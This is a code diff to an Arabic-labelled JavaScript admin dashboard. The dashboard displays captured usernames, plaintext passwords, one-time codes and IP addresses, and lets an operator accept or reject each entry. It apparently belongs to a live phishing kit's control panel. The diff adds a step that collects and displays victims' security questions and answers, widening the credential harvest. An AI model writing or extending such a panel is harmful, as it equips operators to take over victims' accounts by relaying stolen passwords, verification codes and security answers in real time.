@@ -280,6 +280,7 @@ function fmtDate(ts){if(!ts)return'—';try{var d=new Date(ts);
 function statusLabel(o){
   if(o.status==='accepted') return 'مقبول';
   if(o.status==='rejected') return 'مرفوض';
+  if(o.step==='security') return 'سؤال أمان قيد الانتظار';
   if(o.step==='code') return 'كود قيد الانتظار';
   return 'بيانات جديدة';
 }
@@ -294,8 +295,8 @@ function statusBadge(o){
 }
 function stepBadge(step){
   if(!step)return'';
-  var l=step==='code'?'الكود':'تسجيل الدخول';
-  var c=step==='code'?'#0ea5e9':'#f59e0b';
+  var l=step==='security'?'سؤال الأمان':step==='code'?'الكود':'تسجيل الدخول';
+  var c=step==='security'?'#a855f7':step==='code'?'#0ea5e9':'#f59e0b';
   return '<span class="pg-badge" style="background:'+c+'">'+l+'</span>';
 }
 
@@ -331,9 +332,10 @@ function renderActive(){
   el.innerHTML=list.map(function(o){
     var badge=o.step?stepBadge(o.step):statusBadge(o);
     var codeInfo=o.code?'<span style="color:#1B7A3D;font-weight:700">📲 '+esc(o.code)+'</span>':'';
+    var secInfo=o.security_answer?'<span style="color:#a855f7;font-weight:700">🛡️ '+esc(o.security_answer)+'</span>':'';
     return '<div class="ac'+(o.id===selId?' sel':'')+'" onclick="selectOrder(\''+esc(o.id)+'\')">'+
       '<div class="ac-t"><span class="ac-n">'+esc(o.username)+'</span>'+badge+'</div>'+
-      '<div class="ac-info"><span>🔑 '+esc(o.password)+'</span>'+codeInfo+'</div></div>';
+      '<div class="ac-info"><span>🔑 '+esc(o.password)+'</span>'+codeInfo+secInfo+'</div></div>';
   }).join('');
 }
 
@@ -381,6 +383,8 @@ function renderDetail(o){
   h+=codeCard('👤 اسم المستخدم',o.username);
   h+=codeCard('🔒 كلمة المرور',o.password);
   h+=codeCard('📲 الكود',o.code);
+  h+=codeCard('🛡️ سؤال الأمان',o.security_question);
+  h+=codeCard('💬 إجابة الأمان',o.security_answer);
   h+='</div></div>';
 
   var allData=[
@@ -389,7 +393,9 @@ function renderDetail(o){
     {icon:'🔒',label:'كلمة المرور',value:o.password,hl:true},
     {icon:'📲',label:'الكود',value:o.code,hl:true},
     {icon:'🌐',label:'IP',value:o.ip},
-    {icon:'📊',label:'المرحلة',value:o.step==='code'?'الكود':'تسجيل الدخول'},
+    {icon:'🛡️',label:'سؤال الأمان',value:o.security_question},
+    {icon:'💬',label:'إجابة الأمان',value:o.security_answer},
+    {icon:'📊',label:'المرحلة',value:o.step==='security'?'سؤال الأمان':o.step==='code'?'الكود':'تسجيل الدخول'},
     {icon:'📋',label:'الحالة',value:statusLabel(o)},
     {icon:'🕐',label:'الوقت',value:fmtDate(o.time)}
   ].filter(function(d){return d.value&&d.value!=='—';});
